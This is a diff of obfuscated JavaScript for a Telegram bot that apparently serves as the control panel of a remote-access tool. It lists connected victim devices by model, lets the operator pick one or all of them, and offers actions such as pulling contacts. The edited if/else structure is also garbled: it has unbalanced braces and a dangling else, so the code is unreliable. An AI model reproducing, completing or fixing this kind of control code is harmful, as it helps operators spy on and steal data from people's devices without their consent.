@@ -332,42 +332,37 @@ bot.on("message", _0xdbde0c => {
                                                     }
                                                 });
 
-                                                }else {
-                                                    if (_0xdbde0c.text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
-                                                        if (io.sockets.sockets.size === 0x0) {
-
-                                                            bot.sendMessage(data.id,
-                                                                "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
-                                                                { parse_mode: "HTML" }
-                                                            );
-
-                                                        } else {
-
-                                                            let _0x307c8a = [];
-
-                                                            io.sockets.sockets.forEach((_0x6307e5) => {
-                                                                _0x307c8a.push([_0x6307e5.model]);
-                                                            });
-                                                    
-                                                            _0x307c8a.push(["✯ 𝙰𝚕𝚕 ✯"]);
-                                                            _0x307c8a.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
-
-                                                            bot.sendMessage(
-                                                                data.id,
-                                                                "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n",
-                                                                {
-                                                                    parse_mode: "HTML",
-                                                                    reply_markup: {
-                                                                        keyboard: _0x307c8a,
-                                                                        resize_keyboard: true,
-                                                                        one_time_keyboard: true
-                                                                    }
-                                                            }
-                                                         );
+                                                } 
+                                                if (_0xdbde0c.text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
+                                                
+                                                        bot.sendMessage(data.id,
+                                                            "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
+                                                            { parse_mode: "HTML" }
+                                                        );
+                                                    } else {
+                                                        let _0x307c8a = [];
+                                                        io.sockets.sockets.forEach((_0x6307e5) => {
+                                                            _0x307c8a.push([_0x6307e5.model]);
+                                                        });
+                                                
+                                                        _0x307c8a.push(["✯ 𝙰𝚕𝚕 ✯"]);
+                                                        _0x307c8a.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
+                                                        bot.sendMessage(
+                                                            data.id,
+                                                            "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n",
+                                                            {
+                                                                parse_mode: "HTML",
+                                                                reply_markup: {
+                                                                    keyboard: _0x307c8a,
+                                                                    resize_keyboard: true,
+                                                                    one_time_keyboard: true
+                                                                }
                                                         }
-
+                                                     );
                                                     }
-                                                        else if {
+
+                                                }
+                                                        if (_0x3202e5 == "all") {
                                                             bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n", {
                                                                 'parse_mode': "HTML",
                                                                 'reply_markup': {
@@ -385,7 +380,7 @@ bot.on("message", _0xdbde0c => {
                                                                 }
                                                             });
                                                         }
-                                                    } else {
+                                                    }
                                                         if (actions.includes(_0xdbde0c.text)) {
                                                             let _0x3ea82b = appData.get("currentTarget");
                                                             if (_0xdbde0c.text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
@@ -828,12 +823,9 @@ bot.on("message", _0xdbde0c => {
                                 }
                             }
                         }
-                    }
-                }
-            }
-        }
-    }
-});
+                    
+                
+            });
 setInterval(() => {
     io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
         io.to(_0x316932).emit("ping", {});
